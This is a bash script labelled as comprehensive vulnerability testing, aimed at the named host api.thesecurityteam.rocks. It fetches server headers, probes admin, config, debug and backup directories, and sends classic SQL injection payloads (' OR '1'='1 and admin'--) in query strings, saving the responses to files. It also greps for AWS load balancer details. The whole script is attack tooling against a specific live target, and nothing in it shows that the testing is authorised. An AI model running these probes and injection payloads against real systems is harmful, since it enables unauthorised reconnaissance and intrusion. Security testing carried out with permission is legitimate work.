#!/bin/bash
echo "======================================"
echo "COMPREHENSIVE VULNERABILITY TESTING"
echo "TARGET: api.thesecurityteam.rocks"
echo "======================================"

TARGET="api.thesecurityteam.rocks"
PROTOCOL="https"

echo "[INFO] Starting comprehensive testing for $TARGET"
echo "[TIME] $(date)"
echo

# Test 1: Basic connectivity and headers
echo "[TEST 1] Testing basic connectivity and headers..."
curl -s -k -I "$PROTOCOL://$TARGET/" > security_headers.txt
echo "[RESULT] Check security_headers.txt for server information"

# Test 2: Directory enumeration
echo "[TEST 2] Testing common directories..."
for dir in admin api config debug login register test backup; do
    curl -s -k -X GET "$PROTOCOL://$TARGET/$dir/" > "dir_test_$dir.txt"
    echo "  Tested /$dir/ - Status: $(head -1 dir_test_$dir.txt)"
done

# Test 3: SQL Injection testing
echo "[TEST 3] Testing SQL injection..."
curl -s -k -X GET "$PROTOCOL://$TARGET/?id=1' OR '1'='1" > sql_test1.txt
curl -s -k -X GET "$PROTOCOL://$TARGET/?user=admin'--" > sql_test2.txt
echo "[RESULT] Check sql_test*.txt for SQL injection results"

# Analysis
echo
echo "[ANALYSIS] Checking for AWS info..."
grep -i "awselb\|server:" security_headers.txt
echo "Testing completed!"
